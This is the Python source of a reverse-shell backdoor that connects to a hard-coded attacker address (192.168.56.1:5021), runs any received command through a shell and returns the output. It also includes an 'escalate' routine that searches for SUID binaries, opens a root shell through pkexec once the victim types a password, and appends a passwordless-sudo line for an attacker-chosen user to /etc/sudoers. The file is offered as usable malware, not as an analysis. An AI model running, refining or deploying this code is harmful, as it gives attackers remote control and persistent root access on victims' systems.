import socket
import subprocess
import time
import json
import threading
import os

def reliable_send(data):
    try:
        jsondata = json.dumps(data)
    except:
        jsondata = json.dumps("can't dump")
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

## use for find vulnability of suid 
## NOTE THAT : we use /usr/bin/pkexec
def find_suid_binaries():
    suid_files = []
    for root, dirs, files in os.walk('/'):
        for name in files:
            filepath = os.path.join(root, name)
            try:
                if os.stat(filepath).st_mode & 0o4000:
                    suid_files.append(filepath)
            except:
                continue
    return suid_files

def shell():
    esc_process = None
    
    while True:
        try:
            command = reliable_recv()
            print(f"Command ==> {command}")
            if command.lower() == 'exit':
                break
            elif command.lower() == 'test':
                reliable_send(os.name)                  
            elif command.startswith("escalate"):
                reliable_send(os.name)
                if os.name == 'posix':
                    findpkexec = False
                    suid_files = []
                    suid_files = find_suid_binaries()
                    find_suid_result =    f"This is all suid binaries => \n {suid_files}"
                    if "/usr/bin/pkexec" in suid_files:
                        find_suid_result = "Found pkexec!!!!!!\nYou can ESCALATE\n================\n" + find_suid_result
                        findpkexec = True
                    else:
                        find_suid_result = "NO pkexec\n" + find_suid_result
                    reliable_send(find_suid_result)

                    # check that the system has /usr/bin/pkexec
                    if findpkexec:
                        # Run pkexec /bin/bash to gain root shell
                        pkexec_command = "pkexec /bin/bash"
                        esc_process = subprocess.Popen(pkexec_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        
                        # Start threads to read stdout and stderr
                        threading.Thread(target=read_stream, args=(esc_process.stdout,)).start()
                        threading.Thread(target=read_stream, args=(esc_process.stderr,)).start()

                        # Check that user input password or not
                        while True:
                            reliable_send("Waiting user input PASS")
                            time.sleep(1)
                            esc_process.stdin.write("whoami".encode() + b'\n')
                            esc_process.stdin.flush()
                            if read_stream_result == "root":
                                reliable_send("USER has already input PASS")
                                break
                        
                        if esc_process:
                            # run command for escalate specfic user in esc_process
                            user = command[9:] #Define user from server input
                            esc_command = f'echo "{user} ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers_entry\ncat /tmp/sudoers_entry >> /etc/sudoers'
                            esc_process.stdin.write(esc_command.encode() + b'\n')
                            esc_process.stdin.flush()

                            # Wait for done esc_command
                            print("Waiting for esc_command")
                            time.sleep(5)
                            
                            #send the result of sudo -l
                            execute = subprocess.Popen("sudo -l", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                            result = execute.stdout.read() + execute.stderr.read()
                            result = result.decode()
                            result = "ESCALATION DONE\n\n" + result
                            reliable_send(result)
                    else:
                        reliable_send("CAN ESCALATE pkexec not found")
            else:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                reliable_send(result)
        except subprocess.CalledProcessError as e:
            reliable_send(str(e))

def read_stream(stream):
    global read_stream_result
    for line in iter(stream.readline, b''):
        decoded_line = line.decode().strip()
        if decoded_line == "root":
            read_stream_result = decoded_line
    stream.close()


def check_non_output_command(esc_process,command):
    time.sleep(2)
    if esc_process.poll() is None:
        reliable_send(f"Command {command} executed with no output.")

def connect():
    Attacker_tuple = ("192.168.56.1", 5021)
    while True:
        time.sleep(1)
        try:
            s.connect(Attacker_tuple)
            shell()
            s.close()
            break
        except Exception as e:
            print(str(e))
            connect()

if __name__ == "__main__":
    read_stream_result = "-"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect()
